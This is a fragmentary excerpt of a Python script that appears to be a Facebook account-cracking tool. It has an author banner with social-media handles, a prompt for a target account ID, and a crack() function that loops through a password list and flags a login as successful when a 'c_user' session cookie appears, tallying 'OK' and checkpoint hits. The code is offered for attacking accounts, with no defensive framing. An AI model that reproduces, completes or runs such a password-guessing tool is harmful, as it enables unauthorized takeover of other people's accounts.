...
\033[93m ___ ______   _______ _   _  ___  _   _ ___ 
\033[93m|_ _|  _ \ \ / |_   _| | | |/ _ \| \ | |_ _|
\033[99m | || |_) \ V /  | | | |_| | | | |  \| || | 
\033[99m | ||  __/ | |   | | |  _  | |_| | |\  || | 
\033[92m|___|_|    |_|   |_| |_| |_|\___/|_| \_|___|
\x1b[0;34mCREATED BY Hama Bokany
\x1b[0;34m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
\x1b[0;34m█  \33[mGithub2: https:https://github.com/Kak7ama
\x1b[0;38m█  \33[mTELEGRAM:@ _ @H4ma_B0k4ni
\x1b[0;34m█  \33[facebook:محمد حسێن احمد
\x1b[0;34m█  \33[mVersion : \33[1;96mV3
\x1b[0;34m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█"""%(BM))
		print(
			"""\033[1;95m
	...
	[0] Logout
		...
		if chose=='1' or chose=='2':
			...
			account_target = input("  PASTE ID TARGET: ")
			try:
	...
	def crack(self, user, password_list, url):
		...
		for pw in password_list:
			...
			if "c_user" in session.cookies.get_dict():
				...
				opsi.clear()
				break
			sys.stdout.write("\r\033[1;97m[TLYAK] %s/%s\033[1;92mOK|\033[1;91mCP:%s/%s"%(len(loop),len(data_id),len(ok),len(cp)))
			sys.stdout.flush()
		loop.append("memek")
